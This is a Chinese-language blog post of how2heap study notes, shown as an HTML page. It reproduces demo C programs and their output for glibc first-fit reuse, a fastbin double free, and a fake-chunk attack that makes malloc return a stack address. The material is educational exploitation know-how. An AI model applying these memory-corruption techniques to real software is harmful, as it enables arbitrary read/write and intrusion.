@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="HeZhaochen">
+
+
+
+<meta name="description" content="前言 最近比较忙，已经好久没有比较认真的搞一下pwn了，今天就好好学习一下堆利用的相关知识。这里我会通过how2heap这个平台 来进行学习。how2heap是由国际知名CTF战队Shellphish 团队创建的一个仓库，是用来学习堆利用技术广为周知的地方。且 主要针对 glibc2.25和glibc2.26。">
+<meta name="keywords" content="how2heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hoe2heap学习笔记(1)——fastbin_dup">
+<meta property="og:url" content="http://yoursite.com/2019/12/02/how2heap学习笔记-1-——fastbin-dup/index.html">
+<meta property="og:site_name" content="good good study,day day up!">
+<meta property="og:description" content="前言 最近比较忙，已经好久没有比较认真的搞一下pwn了，今天就好好学习一下堆利用的相关知识。这里我会通过how2heap这个平台 来进行学习。how2heap是由国际知名CTF战队Shellphish 团队创建的一个仓库，是用来学习堆利用技术广为周知的地方。且 主要针对 glibc2.25和glibc2.26。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-12-08T08:16:32.614Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hoe2heap学习笔记(1)——fastbin_dup">
+<meta name="twitter:description" content="前言 最近比较忙，已经好久没有比较认真的搞一下pwn了，今天就好好学习一下堆利用的相关知识。这里我会通过how2heap这个平台 来进行学习。how2heap是由国际知名CTF战队Shellphish 团队创建的一个仓库，是用来学习堆利用技术广为周知的地方。且 主要针对 glibc2.25和glibc2.26。">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="good good study,day day up!" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>hoe2heap学习笔记(1)——fastbin_dup | good good study,day day up!</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">HeZhaochen</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/how2heap/">how2heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">HeZhaochen</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">HeZhaochen</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-how2heap学习笔记-1-——fastbin-dup" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/12/02/how2heap学习笔记-1-——fastbin-dup/" class="article-date">
+      <time datetime="2019-12-02T14:38:48.000Z" itemprop="datePublished">2019-12-02</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      hoe2heap学习笔记(1)——fastbin_dup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/how2heap/">how2heap</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 最近比较忙，已经好久没有比较认真的搞一下pwn了，今天就好好学习一下堆利用的相关知识。这里我会通过how2heap这个平台<br> 来进行学习。how2heap是由国际知名CTF战队Shellphish 团队创建的一个仓库，是用来学习堆利用技术广为周知的地方。且<br> 主要针对 glibc2.25和glibc2.26。</p>
+<a id="more"></a>
+<h2 id="fastbin-dup-fit"><a href="#fastbin-dup-fit" class="headerlink" title="fastbin_dup_fit"></a>fastbin_dup_fit</h2><p>这个程序不演示攻击，但是向我们演示了glibc的分配机制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;This can be exploited in a use-after-free situation.\n&quot;);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.\n&quot;);</span><br><span class="line">	char* a = malloc(0x512);</span><br><span class="line">	char* b = malloc(0x256);</span><br><span class="line">	char* c;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1st malloc(0x512): %p\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;2nd malloc(0x256): %p\n&quot;, b);</span><br><span class="line">	fprintf(stderr, &quot;we could continue mallocing here...\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;now let&apos;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;);</span><br><span class="line">	strcpy(a, &quot;this is A!&quot;);</span><br><span class="line">	fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;We don&apos;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;, a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;So, let&apos;s allocate 0x500 bytes\n&quot;);</span><br><span class="line">	c = malloc(506);</span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(0x500): %p\n&quot;, c);</span><br><span class="line">	fprintf(stderr, &quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;);</span><br><span class="line">	strcpy(c, &quot;this is C!&quot;);</span><br><span class="line">	fprintf(stderr, &quot;3rd allocation %p points to %s\n&quot;, c, c);</span><br><span class="line">	fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);</span><br><span class="line">	fprintf(stderr, &quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>glibc使用first-fit算法选择空闲块，如果一个块是空闲的并且足够大，malloc将选择这个块。<br>程序运行如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./first_fit</span><br><span class="line">This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited in a use-after-free situation.</span><br><span class="line">Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.</span><br><span class="line">1st malloc(0x512): 0x1131010</span><br><span class="line">2nd malloc(0x256): 0x1131530</span><br><span class="line">we could continue mallocing here...</span><br><span class="line">now let&apos;s put a string at a that we can read later &quot;this is A!&quot;</span><br><span class="line">first allocation 0x1131010 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don&apos;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x1131010</span><br><span class="line">So, let&apos;s allocate 0x500 bytes</span><br><span class="line">3rd malloc(0x500): 0x1131010</span><br><span class="line">And put a different string here, &quot;this is C!&quot;</span><br><span class="line">3rd allocation 0x1131010 points to this is C!</span><br><span class="line">first allocation 0x1131010 points to this is C!</span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br></pre></td></tr></table></figure>
+
+<p>这里向我们展示了glibc是如何申请一个空间，在free以后又是如何重新申请的</p>
+<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>本程序是一个简单的double_free攻击展示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">	int *a = malloc(8);</span><br><span class="line">	int *b = malloc(8);</span><br><span class="line">	int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">	// free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">	free(b);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&apos;ll get %p twice!\n&quot;, a, b, a, a);</span><br><span class="line">	fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">	fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序运行后如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">./fastbin_dup</span><br><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xa11010</span><br><span class="line">2nd malloc(8): 0xa11030</span><br><span class="line">3rd malloc(8): 0xa11050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xa11010 again, things will crash because 0xa11010 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0xa11030.</span><br><span class="line">Now, we can free 0xa11010 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0xa11010, 0xa11030, 0xa11010 ]. If we malloc 3 times, we&apos;ll get 0xa11010 twice!</span><br><span class="line">1st malloc(8): 0xa11010</span><br><span class="line">2nd malloc(8): 0xa11030</span><br><span class="line">3rd malloc(8): 0xa11010</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以看到，我们首先申请三个空间，释放第一个空间a，这样fastbin就指向a。而fastbin是一个单向链表，每次进行free<br>操作时都会对free list进行检查，所以进行第一次释放后，我们不能直接对a再次进行释放操作。但是当我们把b也释放之后，free<br>list更新成了:0xa11030-&gt;0xa11010,这样就可以成功绕过检查，并且执行double_free。这时候free list被更新成：0xa11010-&gt;<br>0xa11030-&gt;0xa11010。之后我们就可以malloc三次，就在同一个地址malloc了两次，得到了两个指向了同一个地址的指针</p>
+<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>这个程序是对fastbin_dup的延伸，通过double修改fd指针，构造一个fake_chunk，以达到任意地址读写的目的。<br>源码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><span class="line">	       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</span><br><span class="line"></span><br><span class="line">	unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">	int *a = malloc(8);</span><br><span class="line">	int *b = malloc(8);</span><br><span class="line">	int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">	// free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">	free(b);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><span class="line">		&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</span><br><span class="line">	unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d);</span><br><span class="line">	fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">	fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><span class="line">		&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><span class="line">		&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><span class="line">		&quot;return a pointer to it.\n&quot;, a);</span><br><span class="line">	stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</span><br><span class="line">	*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</span><br><span class="line">	fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行程序后，显示如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffc2e12fc28.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x2079010</span><br><span class="line">2nd malloc(8): 0x2079030</span><br><span class="line">3rd malloc(8): 0x2079050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x2079010 again, things will crash because 0x2079010 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0x2079030.</span><br><span class="line">Now, we can free 0x2079010 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x2079010, 0x2079030, 0x2079010 ]. We&apos;ll now carry out our attack by modifying data at 0x2079010.</span><br><span class="line">1st malloc(8): 0x2079010</span><br><span class="line">2nd malloc(8): 0x2079030</span><br><span class="line">Now the free list has [ 0x2079010 ].</span><br><span class="line">Now, we have access to 0x2079010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x2079010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x2079010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffc2e12fc28</span><br></pre></td></tr></table></figure>
+
+<p>之前的步骤都和上一个例子差不多，经过一次double_free后，fastbin里的单链表结构为：0x2079010-&gt;0x2079030-&gt;0x2079010<br>之后我们进行两次malloc，fastbin表头重新变为0x2079010。这时，我们就可以一直申请0x2079010这个地址了。这样我们就可以来<br>构造fake_chunk。<br>程序中，d申请的是chunk_A的地址，而fastbin_list中的地址也是0x2079010。<br>之后就是攻击中最关键的一步了。取satck_var-8的地址，写入d的fd中，这样就伪造了一个fake_chunk<br>而这样，当程序再次进行malloc时，就会认为这里有一个free_chunk并且同意返回一个指向这个栈地址的指针。而如果我们对内存的<br>读写权限，就可以进行对内存的任意地址读写。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/12/02/how2heap学习笔记-1-——fastbin-dup/">hoe2heap学习笔记(1)——fastbin_dup</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">HeZhaochen</a></p>
+        <p><span>发布时间:</span>2019-12-02, 22:38:48</p>
+        <p><span>最后更新:</span>2019-12-08, 16:16:32</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/12/02/how2heap学习笔记-1-——fastbin-dup/" title="hoe2heap学习笔记(1)——fastbin_dup">http://yoursite.com/2019/12/02/how2heap学习笔记-1-——fastbin-dup/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/12/02/how2heap学习笔记-1-——fastbin-dup/　　作者: HeZhaochen" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/11/20/XCTF-format2-整数溢出/">
+                    XCTF-format2-整数溢出
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-fit"><span class="toc-number">2.</span> <span class="toc-text">fastbin_dup_fit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">3.</span> <span class="toc-text">fastbin_dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-number">4.</span> <span class="toc-text">fastbin_dup_into_stack</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
